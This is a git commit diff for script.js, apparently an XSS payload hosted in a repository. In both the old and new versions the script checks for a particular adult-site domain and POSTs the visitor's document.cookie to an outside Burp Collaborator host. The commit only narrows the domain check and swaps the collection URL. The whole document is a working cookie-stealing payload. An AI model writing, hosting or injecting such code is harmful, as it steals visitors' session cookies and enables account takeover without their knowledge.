03b4c689b78f1befa87187900d03ea853f17d8a4
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-11-30 20:53:23 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
-if (document.domain == "www.pornhub.org" | document.domain == "www.pornhub.com") {
-  fetch('https://7gop7eqr1j0dncdpmwjjug8w2n8gw5.burpcollaborator.net', {
+if (document.domain == "www.pornhub.org") {
+  fetch('https://hpat22tkc1x8tvy41clplrdwtnzdn2.burpcollaborator.net', {
   method: 'POST',
   mode: 'no-cors',
   body:document.cookie
